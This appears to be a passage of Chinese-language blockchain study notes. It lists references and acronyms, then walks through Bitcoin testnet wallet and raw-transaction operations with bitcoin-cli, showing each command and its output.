[TOC]

------

## 参考资料

- [比特币白皮书中英文对照版](http://www.ehcoo.com/A%20Peer-to-Peer%20Electronic%20Cash%20System.html)
- [精通比特币](http://book.8btc.com/books/1/master_bitcoin/_book/)
- [精通比特币第二版](http://book.8btc.com/books/6/masterbitcoin2cn/_book/)
- [Learning-Bitcoin-from-the-Command-Line](https://github.com/ChristopherA/Learning-Bitcoin-from-the-Command-Line)
- [调试 BTC 脚本](https://github.com/kallewoof/btcdeb)
- [比特币编解码小工具](http://learnmeabitcoin.com/tools/)
- [python-OP_RETURN](https://github.com/coinspark/python-OP_RETURN)
- [bitcoin-api](http://chainquery.com/bitcoin-api)
- [developer-examples](https://bitcoin.org/en/developer-examples)
- [bitcoin-2-of-3-multisig](https://github.com/anders94/bitcoin-2-of-3-multisig)
- [unspent-transaction-output-set](https://statoshi.info/dashboard/db/unspent-transaction-output-set)
- [区块链技术指南](http://book.8btc.com/blockchain_guide)
- [区块链维基百科](https://en.wikipedia.org/wiki/Blockchain)
- [图灵完备维基百科](https://en.wikipedia.org/wiki/Turing_completeness)
- [基于区块链的存证业务构想](https://zhuanlan.zhihu.com/p/33462619)
- [以太坊白皮书](https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%99%BD%E7%9A%AE%E4%B9%A6)
- [Ethereum Improvement Proposals (EIPs)](https://eips.ethereum.org/)
- [以太坊搭建私链](https://souptacular.gitbooks.io/ethereum-tutorials-and-tips-by-hudson/content/private-chain.html)
- [以太坊 Web3.js 开发基础](https://www.jianshu.com/p/f3f36447546e)
- [Web3.js API 中文文档](http://web3.tryblockchain.org/index.html)
- [Web3 tutorial](https://github.com/cooleye/web3tutorial)
- [Solidity 中文开发文档](http://solidity-cn.readthedocs.io/zh/develop/index.html)
- [Solidity 英文开发文档](http://solidity.readthedocs.io/en/v0.4.24/)
- [Contract tutorial](https://github.com/ethereum/go-ethereum/wiki/Contract-Tutorial)
- [ETH Gas Station](https://ethgasstation.info/)
- [以太坊 - 疫苗之王](https://etherscan.io/tx/0xb1ed364e4333aae1da4a901d5231244ba6a35f9421d4607f7cb90d60bf45578a)
- [ethereum cancel pending transaction](https://jakubstefanski.com/post/2017/10/ethereum-cancel-pending-transaction/)
- [Data Insertion in Bitcoin's Blockchain](https://digitalcommons.augustana.edu/cgi/viewcontent.cgi?article=1000&context=cscfaculty)
- [以太坊智能合约 - 函数多签](https://hackmd.io/s/HkkT9H5NX)
- [Solidity Security](https://blog.sigmaprime.io/solidity-security.html)
- [Oraclize](https://docs.oraclize.it/#ethereum)
- [P2P 网络](https://www.kancloud.cn/everpointer/test1/597770)
- [比特币测试网络区块浏览器](https://live.blockcypher.com/)
- [比特币区块浏览器](https://www.blockchain.com/)
- [以太坊区块浏览器](https://etherscan.io/)
- [比特币测试币水龙头]( https://testnet.manu.backend.hamburg/faucet)
- [coin market cap](https://coinmarketcap.com/)
- [truffle framework tutorials](https://truffleframework.com/tutorials)
- [infura docs](https://infura.io/docs)
- [为什么比特币硬分叉不会分裂成两个币？](https://bitcointalk.org/index.php?topic=1837147.0;imode) 

## 缩略词

| 缩略词 | 定义/解释                                             |      |
| ------ | ----------------------------------------------------- | ---- |
| PoW    | 工作量证明（Proof of Work）                           |      |
| PoS    | 权益证明（Proof of Stake）                            |      |
| DPoS   | 股份授权证明（Delegate Proof of Stake）               |      |
| PBFT   | 实用拜占庭容错（Practical Byzantine Fault Tolerance） |      |
| P2P    | 点对点（Peer to Peer）                                |      |
| DApp   | 分布式应用（Decentralized Application）               |      |

## DIY

### 比特币测试网络

> **基础环境： **Ubuntu 14.04.5 LTS/Bitcoin Code Daemon v0.16.99.0-7c32b41
>

#### 启动服务

##### bitcoind

```bash
kevin@ubuntu:~$ bitcoind -testnet
```

##### bitcoin-cli

> **API 接口：**https://en.bitcoin.it/wiki/Original_Bitcoin_client/API_calls_list

```bash
root@iZwz978rorvlg75nct99l1Z:~# bitcoin-cli -testnet -h
Bitcoin Core RPC client version v0.17.99.0-be99270

Usage:  bitcoin-cli [options] <command> [params]  Send command to Bitcoin Core
or:     bitcoin-cli [options] -named <command> [name=value]...  Send command to Bitcoin Core (with named arguments)
or:     bitcoin-cli [options] help                List commands
or:     bitcoin-cli [options] help <command>      Get help for a command
```

#### 基础功能

##### 状态信息

```bash
kevin@ubuntu:~$ bitcoin-cli -testnet -getinfo
{
  "version": 169900,
  "protocolversion": 70015,
  "walletversion": 169900,
  "balance": 1.65000000,
  "blocks": 1325293,
  "timeoffset": 3,
  "connections": 5,
  "proxy": "",
  "difficulty": 47237276.6179756,
  "testnet": true,
  "keypoololdest": 1528804513,
  "keypoolsize": 1000,
  "paytxfee": 0.00000000,
  "relayfee": 0.00001000,
  "warnings": "This is a pre-release test build - use at your own risk - do not use for mining or merchant applications"
}
```

##### 查看 UTXOset

```bash
root@ubuntu:~# bitcoin-cli -testnet gettxoutsetinfo
{
  "height": 1439004,
  "bestblock": "000000000000038fa537b200a3385df20d74733b68db7c55b2352e561a19c4b3",
  "transactions": 6217918,
  "txouts": 20349375,
  "bogosize": 1528706234,
  "hash_serialized_2": "d98c6a7b349f7f177663de37256c3073e525d23c5bf8aae60c9e531b06598835",
  "disk_size": 1069346272,
  "total_amount": 20810885.93776073
}
```

##### 钱包信息

> 可通过 https://testnet.manu.backend.hamburg/faucet 获取免费的测试币

![](pic/blockchain/faucet.png)

```bash
kevin@ubuntu:~$ bitcoin-cli -testnet getwalletinfo
{
  "walletname": "",
  "walletversion": 169900,
  "balance": 1.65000000,
  "unconfirmed_balance": 0.00000000,
  "immature_balance": 0.00000000,
  "txcount": 2,
  "keypoololdest": 1528804513,
  "keypoolsize": 1000,
  "keypoolsize_hd_internal": 1000,
  "paytxfee": 0.00000000,
  "hdseedid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "hdmasterkeyid": "44f0e603435bf5f58481b24fd597e8bd9180c840"
}
```

##### 交易列表

```bash
kevin@ubuntu:~$ bitcoin-cli -testnet listtransactions
[
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "category": "receive",
    "amount": 1.10000000,
    "label": "",
    "vout": 0,
    "confirmations": 106,
    "blockhash": "0000000000003f000137e5a3c5c8664b559c598b4edf293dac821dcbd24ba905",
    "blockindex": 39,
    "blocktime": 1528857252,
    "txid": "93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd",
    "walletconflicts": [
    ],
    "time": 1528854102,
    "timereceived": 1528854102,
    "bip125-replaceable": "no"
  },
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "category": "receive",
    "amount": 0.55000000,
    "label": "",
    "vout": 0,
    "confirmations": 105,
    "blockhash": "000000000000002bf6b26f415d62c1c8a55b4463de8abb9ee1d467da86c77082",
    "blockindex": 5,
    "blocktime": 1528857923,
    "txid": "7db5ac458ac204ceef8c23564f729ae1a3846e27815352d1d8e9275649ef5b9b",
    "walletconflicts": [
    ],
    "time": 1528857557,
    "timereceived": 1528857557,
    "bip125-replaceable": "no"
  }
]
```

##### 节点信息

```bash
$ ./bitcoin-cli.exe -testnet getpeerinfo
[
    {
        "addr" : "88.196.208.18:18333",
        "addrlocal" : "[2001:0:9d38:953c:347f:a0a9:8ea6:9fa3]:18333",
        "services" : "0000000d",
        "lastsend" : 1529043904,
        "lastrecv" : 1529043889,
        "bytessent" : 72605,
        "bytesrecv" : 105714,
        "conntime" : 1529028404,
        "pingtime" : 0.00000000,
        "version" : 70015,
        "subver" : "/Satoshi:0.15.1/",
        "inbound" : false,
        "startingheight" : 1325463,
        "banscore" : 10,
        "syncnode" : true
    },
    {
        "addr" : "46.101.233.205:18333",
        "addrlocal" : "[2001:0:9d38:953c:347f:a0a9:8ea6:9fa3]:18333",
        "services" : "0000040d",
        "lastsend" : 1529043904,
        "lastrecv" : 1529043898,
        "bytessent" : 71706,
        "bytesrecv" : 463017,
        "conntime" : 1529028422,
        "pingtime" : 0.00000000,
        "version" : 70015,
        "subver" : "/Satoshi:0.16.0/",
        "inbound" : false,
        "startingheight" : 1325463,
        "banscore" : 10,
        "syncnode" : false
    }
]
```

##### 区块高度

```bash
$ ./bitcoin-cli.exe -testnet getblockcount
1325482
```

##### 按地址收款列表

```bash
root@ubuntu:~# bitcoin-cli -testnet listreceivedbyaddress
[
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "account": "",
    "amount": 1.65000000,
    "confirmations": 89158,
    "label": "",
    "txids": [
      "7db5ac458ac204ceef8c23564f729ae1a3846e27815352d1d8e9275649ef5b9b",
      "93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd"
    ]
  }
]
```

##### 导出私钥

```bash
root@ubuntu:~# bitcoin-cli -testnet dumpprivkey 2NDj3tQw3RVmLzQa7CF9EXcBhyCgbVbEgDV
cTAdmTWpCQepcTFsYzxc1ZGVckdmEa23aZcTGbTQVSuB3iGX8XPC
```

##### 查询余额

```bash
root@ubuntu:~# bitcoin-cli -testnet getbalance
1.62796680
```

##### 未花费输出

```bash
root@ubuntu:~# bitcoin-cli -testnet listunspent
[
  {
    "txid": "8e176938a3b43a27879b2d5362f546fbd8964ca7dd2b1d86f6bb612add5d8527",
    "vout": 1,
    "address": "2NDj3tQw3RVmLzQa7CF9EXcBhyCgbVbEgDV",
    "redeemScript": "0014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5",
    "scriptPubKey": "a914e0a5bb045c7de267df7dab1fc190111ab255d6fa87",
    "amount": 0.52900000,
    "confirmations": 30552,
    "spendable": true,
    "solvable": true,
    "safe": true
  },
  {
    "txid": "93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd",
    "vout": 0,
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "label": "",
    "redeemScript": "0014635522cd6d36b45cf770940c78642f266b143ff2",
    "scriptPubKey": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
    "amount": 1.10000000,
    "confirmations": 31194,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

##### 创建原始交易

> 使用未花费输出 `8e176938a3b43a27879b2d5362f546fbd8964ca7dd2b1d86f6bb612add5d8527` 给地址 `2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ` 转账 `0.528` 比特币，其中，`fee = 0.529 - 0.528 = 0.001`

```bash
root@ubuntu:~# bitcoin-cli -testnet createrawtransaction "[{\"txid\":\"8e176938a3b43a27879b2d5362f546fbd8964ca7dd2b1d86f6bb612add5d8527\",\"vout\":1}]" "[{\"2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ\":0.528}]" 
020000000127855ddd2a61bbf6861d2bdda74c96d8fb46f562532d9b87273ab4a33869178e0100000000ffffffff0100aa25030000000017a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff8700000000
```

##### 交易签名

```bash
root@ubuntu:~# bitcoin-cli -testnet signrawtransactionwithkey 020000000127855ddd2a61bbf6861d2bdda74c96d8fb46f562532d9b87273ab4a33869178e0100000000ffffffff0100aa25030000000017a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff8700000000 "[\"cTAdmTWpCQepcTFsYzxc1ZGVckdmEa23aZcTGbTQVSuB3iGX8XPC\"]"
{
  "hex": "0200000000010127855ddd2a61bbf6861d2bdda74c96d8fb46f562532d9b87273ab4a33869178e0100000017160014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5ffffffff0100aa25030000000017a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87024830450221009f5fb6990ade3a66d2156baf64054d73b16b2018c8fd91da25e09f57fa4a3723022059473e88b830653d3cb619c7a55c3b754d2513e3b99b4908a1b6b649ae6fe4e8012102579b88b0ab515c6fb7c668f42a0a7922d58b2c17f60ab041330094a8f1a938b500000000",
  "complete": true
}
```

##### 解码原始交易

```bash
root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction  0200000000010127855ddd2a61bbf6861d2bdda74c96d8fb46f562532d9b87273ab4a33869178e0100000017160014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5ffffffff0100aa25030000000017a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87024830450221009f5fb6990ade3a66d2156baf64054d73b16b2018c8fd91da25e09f57fa4a3723022059473e88b830653d3cb619c7a55c3b754d2513e3b99b4908a1b6b649ae6fe4e8012102579b88b0ab515c6fb7c668f42a0a7922d58b2c17f60ab041330094a8f1a938b500000000
{
  "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
  "hash": "5ca5c2eefac016dd9bde96199926d1407d32d3ccf779ac04fba687294cc1d4c0",
  "version": 2,
  "size": 216,
  "vsize": 134,
  "weight": 534,
  "locktime": 0,
  "vin": [
    {
      "txid": "8e176938a3b43a27879b2d5362f546fbd8964ca7dd2b1d86f6bb612add5d8527",
      "vout": 1,
      "scriptSig": {
        "asm": "0014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5",
        "hex": "160014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5"
      },
      "txinwitness": [
        "30450221009f5fb6990ade3a66d2156baf64054d73b16b2018c8fd91da25e09f57fa4a3723022059473e88b830653d3cb619c7a55c3b754d2513e3b99b4908a1b6b649ae6fe4e801",
        "02579b88b0ab515c6fb7c668f42a0a7922d58b2c17f60ab041330094a8f1a938b5"
      ],
      "sequence": 4294967295
    }
  ],
  "vout": [
    {
      "value": 0.52800000,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_HASH160 a23c6a5cacf99a19b5a1c0da422e4df60bc391ff OP_EQUAL",
        "hex": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ"
        ]
      }
    }
  ]
}
```

##### 发送原始交易

```bash
root@ubuntu:~# bitcoin-cli -testnet sendrawtransaction 0200000000010127855ddd2a61bbf6861d2bdda74c96d8fb46f562532d9b87273ab4a33869178e0100000017160014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5ffffffff0100aa25030000000017a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87024830450221009f5fb6990ade3a66d2156baf64054d73b16b2018c8fd91da25e09f57fa4a3723022059473e88b830653d3cb619c7a55c3b754d2513e3b99b4908a1b6b649ae6fe4e8012102579b88b0ab515c6fb7c668f42a0a7922d58b2c17f60ab041330094a8f1a938b500000000
750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0
```

##### 查询交易

![](pic/blockchain/get_transaction.png)

```bash
root@ubuntu:~# bitcoin-cli -testnet gettransaction 750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0
{
  "amount": 0.00000000,
  "fee": -0.00100000,
  "confirmations": 0,
  "trusted": true,
  "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
  "walletconflicts": [
  ],
  "time": 1539079035,
  "timereceived": 1539079035,
  "bip125-replaceable": "no",
  "details": [
    {
      "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
      "category": "send",
      "amount": -0.52800000,
      "label": "",
      "vout": 0,
      "fee": -0.00100000,
      "abandoned": false
    },
    {
      "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
      "category": "receive",
      "amount": 0.52800000,
      "label": "",
      "vout": 0
    }
  ],
  "hex": "0200000000010127855ddd2a61bbf6861d2bdda74c96d8fb46f562532d9b87273ab4a33869178e0100000017160014174f64fd72b0971bb77a7c40abe5b7deb5c6eea5ffffffff0100aa25030000000017a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87024830450221009f5fb6990ade3a66d2156baf64054d73b16b2018c8fd91da25e09f57fa4a3723022059473e88b830653d3cb619c7a55c3b754d2513e3b99b4908a1b6b649ae6fe4e8012102579b88b0ab515c6fb7c668f42a0a7922d58b2c17f60ab041330094a8f1a938b500000000"
}
```

此时，再次查询未花费输出

```bash
root@ubuntu:~# bitcoin-cli -testnet listunspent
[
  {
    "txid": "93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd",
    "vout": 0,
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "label": "",
    "redeemScript": "0014635522cd6d36b45cf770940c78642f266b143ff2",
    "scriptPubKey": "a914a23c6a5cacf99a19b5a1c0da422e4df60bc391ff87",
    "amount": 1.10000000,
    "confirmations": 89159,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

##### 交易列表

```bash
root@ubuntu:~# bitcoin-cli -testnet listtransactions
[
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "category": "receive",
    "amount": 1.10000000,
    "label": "",
    "vout": 0,
    "confirmations": 57991,
    "blockhash": "0000000000003f000137e5a3c5c8664b559c598b4edf293dac821dcbd24ba905",
    "blockindex": 39,
    "blocktime": 1528857252,
    "txid": "93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd",
    "walletconflicts": [
    ],
    "time": 1528854102,
    "timereceived": 1528854102,
    "bip125-replaceable": "no"
  },
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "category": "receive",
    "amount": 0.55000000,
    "label": "",
    "vout": 0,
    "confirmations": 57990,
    "blockhash": "000000000000002bf6b26f415d62c1c8a55b4463de8abb9ee1d467da86c77082",
    "blockindex": 5,
    "blocktime": 1528857923,
    "txid": "7db5ac458ac204ceef8c23564f729ae1a3846e27815352d1d8e9275649ef5b9b",
    "walletconflicts": [
    ],
    "time": 1528857557,
    "timereceived": 1528857557,
    "bip125-replaceable": "no"
  },
  {
    "address": "2N8hwP1WmJrFF5QWABn38y63uYLhnJYJYTF",
    "category": "send",
    "amount": -0.02099834,
    "label": "https://testnet.manu.backend.hamburg/faucet",
    "vout": 0,
    "fee": -0.00000166,
    "confirmations": 57349,
    "blockhash": "0000000000000039f9de143420eccd49afe0f024c37c8c8052d4713e7b5c2cd6",
    "blockindex": 1103,
    "blocktime": 1529488973,
    "txid": "8e176938a3b43a27879b2d5362f546fbd8964ca7dd2b1d86f6bb612add5d8527",
    "walletconflicts": [
    ],
    "time": 1529477301,
    "timereceived": 1529477301,
    "bip125-replaceable": "no",
    "abandoned": false
  },
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "category": "receive",
    "amount": 0.52800000,
    "label": "",
    "vout": 0,
    "confirmations": 0,
    "trusted": false,
    "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
    "walletconflicts": [
    ],
    "time": 1539079035,
    "timereceived": 1539079035,
    "bip125-replaceable": "unknown"
  },
  {
    "address": "2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ",
    "category": "send",
    "amount": -0.52800000,
    "label": "",
    "vout": 0,
    "fee": -0.00100000,
    "confirmations": 0,
    "trusted": false,
    "txid": "750183a0d47f62a428b4dd811eed414141d3e8013cd372930882ce11b867e7f0",
    "walletconflicts": [
    ],
    "time": 1539079035,
    "timereceived": 1539079035,
    "bip125-replaceable": "unknown",
    "abandoned": false
  }
]
```

##### 生成新地址

```bash
root@ubuntu:~# bitcoin-cli -testnet getnewaddress
2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m
```

##### 查询地址信息

```bash
root@ubuntu:~# bitcoin-cli -testnet getaddressinfo 2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m
{
  "address": "2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m",
  "scriptPubKey": "a914a3a0ba5cb95a1878466d4465ed14752b3d8292fc87",
  "ismine": true,
  "iswatchonly": false,
  "isscript": true,
  "iswitness": false,
  "script": "witness_v0_keyhash",
  "hex": "001488ea91fb46dbf96d9d3a7e70bd1124f768ed9638",
  "pubkey": "03dafede81c5886651093472c74e53a9caeb859577a435909a5f42a418366f81a4",
  "embedded": {
    "isscript": false,
    "iswitness": true,
    "witness_version": 0,
    "witness_program": "88ea91fb46dbf96d9d3a7e70bd1124f768ed9638",
    "pubkey": "03dafede81c5886651093472c74e53a9caeb859577a435909a5f42a418366f81a4",
    "address": "tb1q3r4fr76xm0ukm8f60ect6yfy7a5wm93ct8f9e3",
    "scriptPubKey": "001488ea91fb46dbf96d9d3a7e70bd1124f768ed9638"
  },
  "label": "",
  "timestamp": 1528804513,
  "hdkeypath": "m/0'/0'/2'",
  "hdseedid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "hdmasterkeyid": "44f0e603435bf5f58481b24fd597e8bd9180c840",
  "labels": [
    {
      "name": "",
      "purpose": "receive"
    }
  ]
}
```

##### 转账

- P2SH 转账

```bash
root@ubuntu:~# bitcoin-cli -testnet sendtoaddress 2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m 0.1
28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7
```

此时，自动找出满足条件的未花费输出，并且设置小费，可通过查询交易信息验证

> 选择未花费输出 1.1 BTC，转账金额 0.1 BTC，消费 0.00003320 BTC，找零 0.99996680 BTC
>
> 综上：`0.1 + 0.0.00003320 + 0.99996680 = 1.1`

![](pic/blockchain/sendtoaddress.png)

```bash
root@ubuntu:~# bitcoin-cli -testnet gettransaction 28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7
{
  "amount": 0.00000000,
  "fee": -0.00003320,
  "confirmations": 0,
  "trusted": true,
  "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
  "walletconflicts": [
  ],
  "time": 1539141307,
  "timereceived": 1539141307,
  "bip125-replaceable": "no",
  "details": [
    {
      "address": "2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m",
      "category": "send",
      "amount": -0.10000000,
      "label": "",
      "vout": 0,
      "fee": -0.00003320,
      "abandoned": false
    },
    {
      "address": "2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m",
      "category": "receive",
      "amount": 0.10000000,
      "label": "",
      "vout": 0
    }
  ],
  "hex": "02000000000101cd3cc99c5d6a2b470838eff1c319d6a8093c5d70f79c794c95b0ade30944ee930000000017160014635522cd6d36b45cf770940c78642f266b143ff2feffffff02809698000000000017a914a3a0ba5cb95a1878466d4465ed14752b3d8292fc8708d4f5050000000017a914c6f9118389ab61e9a4d8a1c8cf048b46358092a48702483045022100b16fde32330991d153bd4913ed1522cf110db1c65e3e222af41addba385c87ed02200ccd72a1871a3129d489f2947701b1700679c319211a77174c7df424f57065eb012102838aa4c771101a3045692ff1e49a583dd1a7e537f855bbe30324eed283cc8b30ad351500"
}
```

```bash
root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction  02000000000101cd3cc99c5d6a2b470838eff1c319d6a8093c5d70f79c794c95b0ade30944ee930000000017160014635522cd6d36b45cf770940c78642f266b143ff2feffffff02809698000000000017a914a3a0ba5cb95a1878466d4465ed14752b3d8292fc8708d4f5050000000017a914c6f9118389ab61e9a4d8a1c8cf048b46358092a48702483045022100b16fde32330991d153bd4913ed1522cf110db1c65e3e222af41addba385c87ed02200ccd72a1871a3129d489f2947701b1700679c319211a77174c7df424f57065eb012102838aa4c771101a3045692ff1e49a583dd1a7e537f855bbe30324eed283cc8b30ad351500
{
  "txid": "28f0246fd9a867cc93b1b7e6231c47789fad8256f866c7c548d6d4ebe8cfa3a7",
  "hash": "8a245bb68be22f4ff2ee836115f5b2e4f494d133414a22c7d093749f8d4853d1",
  "version": 2,
  "size": 248,
  "vsize": 166,
  "weight": 662,
  "locktime": 1389997,
  "vin": [
    {
      "txid": "93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd",
      "vout": 0,
      "scriptSig": {
        "asm": "0014635522cd6d36b45cf770940c78642f266b143ff2",
        "hex": "160014635522cd6d36b45cf770940c78642f266b143ff2"
      },
      "txinwitness": [
        "3045022100b16fde32330991d153bd4913ed1522cf110db1c65e3e222af41addba385c87ed02200ccd72a1871a3129d489f2947701b1700679c319211a77174c7df424f57065eb01",
        "02838aa4c771101a3045692ff1e49a583dd1a7e537f855bbe30324eed283cc8b30"
      ],
      "sequence": 4294967294
    }
  ],
  "vout": [
    {
      "value": 0.10000000,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_HASH160 a3a0ba5cb95a1878466d4465ed14752b3d8292fc OP_EQUAL",
        "hex": "a914a3a0ba5cb95a1878466d4465ed14752b3d8292fc87",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2N8AQg8NhqVy77jPjkz7viHbvJ7aQQLcv8m"
        ]
      }
    },
    {
      "value": 0.99996680,
      "n": 1,
      "scriptPubKey": {
        "asm": "OP_HASH160 c6f9118389ab61e9a4d8a1c8cf048b46358092a4 OP_EQUAL",
        "hex": "a914c6f9118389ab61e9a4d8a1c8cf048b46358092a487",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2NBPJ9qrWzbNLru6Nbi5L7DHyZZziyjzWGW"
        ]
      }
    }
  ]
}
```

- P2PKH 转账

> 解锁脚本中，对于找零地址 `2MvbfqkYTRfEurhJ9iP9hgbUGAL4Ed8ebdX`，属于 P2SH；对于目标地址 `mu2cVKoUsTSyUEJJMMbhNuGa6yVvMvXj6n`，属于 P2PKH

![](pic/blockchain/send_to_address2.png)

```bash
root@ubuntu:~# bitcoin-cli -testnet sendtoaddress mu2cVKoUsTSyUEJJMMbhNuGa6yVvMvXj6n 0.2
f475b1d691096d922c54ec7d4f65287b00305f68431c7ca31700e714e6139843
root@ubuntu:~# bitcoin-cli -testnet gettransaction f475b1d691096d922c54ec7d4f65287b00305f68431c7ca31700e714e6139843
{
  "amount": -0.20000000,
  "fee": -0.00000172,
  "confirmations": 1,
  "blockhash": "00000000000001bf87a5803c54b4686fbc8612e077016d8f02bf0be22d288480",
  "blockindex": 13,
  "blocktime": 1539683239,
  "txid": "f475b1d691096d922c54ec7d4f65287b00305f68431c7ca31700e714e6139843",
  "walletconflicts": [
  ],
  "time": 1539683131,
  "timereceived": 1539683131,
  "bip125-replaceable": "no",
  "details": [
    {
      "address": "mu2cVKoUsTSyUEJJMMbhNuGa6yVvMvXj6n",
      "category": "send",
      "amount": -0.20000000,
      "vout": 1,
      "fee": -0.00000172,
      "abandoned": false
    }
  ],
  "hex": "020000000001019045478e19afe707eefcf0a5dcf323294226e03ad5d27664d4370becd6c9a06f0100000017160014634c5b2ab67c8ea9f0888217509994e56d5e928bfeffffff0274c8a1010000000017a91424c64709bfd829949d4948a9dda8daabe9b5f2c387002d3101000000001976a914943594c2eec7e6e386b7f7ca5c84b623d989882a88ac0247304402205d7bb5cd13a1bcc7d2018336478d2421a40cf4be5e89d449ecb121889444947a022012b4852470cc96d9113f84f900de835501b9564345134e521d4b88c291eda621012103febd10527fd74cca6b7ee1109a9a00f9e94355a0bb4c5a474f7d0a457110abf266f31500"
}
root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction 020000000001019045478e19afe707eefcf0a5dcf323294226e03ad5d27664d4370becd6c9a06f0100000017160014634c5b2ab67c8ea9f0888217509994e56d5e928bfeffffff0274c8a1010000000017a91424c64709bfd829949d4948a9dda8daabe9b5f2c387002d3101000000001976a914943594c2eec7e6e386b7f7ca5c84b623d989882a88ac0247304402205d7bb5cd13a1bcc7d2018336478d2421a40cf4be5e89d449ecb121889444947a022012b4852470cc96d9113f84f900de835501b9564345134e521d4b88c291eda621012103febd10527fd74cca6b7ee1109a9a00f9e94355a0bb4c5a474f7d0a457110abf266f31500
{
  "txid": "f475b1d691096d922c54ec7d4f65287b00305f68431c7ca31700e714e6139843",
  "hash": "888813d88348067684b933cfd6ad5aaf51ac27530bee2dcec3ac475f38369b41",
  "version": 2,
  "size": 249,
  "vsize": 168,
  "weight": 669,
  "locktime": 1438566,
  "vin": [
    {
      "txid": "6fa0c9d6ec0b37d46476d2d53ae026422923f3dca5f0fcee07e7af198e474590",
      "vout": 1,
      "scriptSig": {
        "asm": "0014634c5b2ab67c8ea9f0888217509994e56d5e928b",
        "hex": "160014634c5b2ab67c8ea9f0888217509994e56d5e928b"
      },
      "txinwitness": [
        "304402205d7bb5cd13a1bcc7d2018336478d2421a40cf4be5e89d449ecb121889444947a022012b4852470cc96d9113f84f900de835501b9564345134e521d4b88c291eda62101",
        "03febd10527fd74cca6b7ee1109a9a00f9e94355a0bb4c5a474f7d0a457110abf2"
      ],
      "sequence": 4294967294
    }
  ],
  "vout": [
    {
      "value": 0.27379828,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_HASH160 24c64709bfd829949d4948a9dda8daabe9b5f2c3 OP_EQUAL",
        "hex": "a91424c64709bfd829949d4948a9dda8daabe9b5f2c387",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2MvbfqkYTRfEurhJ9iP9hgbUGAL4Ed8ebdX"
        ]
      }
    },
    {
      "value": 0.20000000,
      "n": 1,
      "scriptPubKey": {
        "asm": "OP_DUP OP_HASH160 943594c2eec7e6e386b7f7ca5c84b623d989882a OP_EQUALVERIFY OP_CHECKSIG",
        "hex": "76a914943594c2eec7e6e386b7f7ca5c84b623d989882a88ac",
        "reqSigs": 1,
        "type": "pubkeyhash",
        "addresses": [
          "mu2cVKoUsTSyUEJJMMbhNuGa6yVvMvXj6n"
        ]
      }
    }
  ]
}
```

##### OP_RETURN 携带数据

选择未花费输出 `0.1`

```bash
root@ubuntu:~# bitcoin-cli -testnet listunspent
[
  {
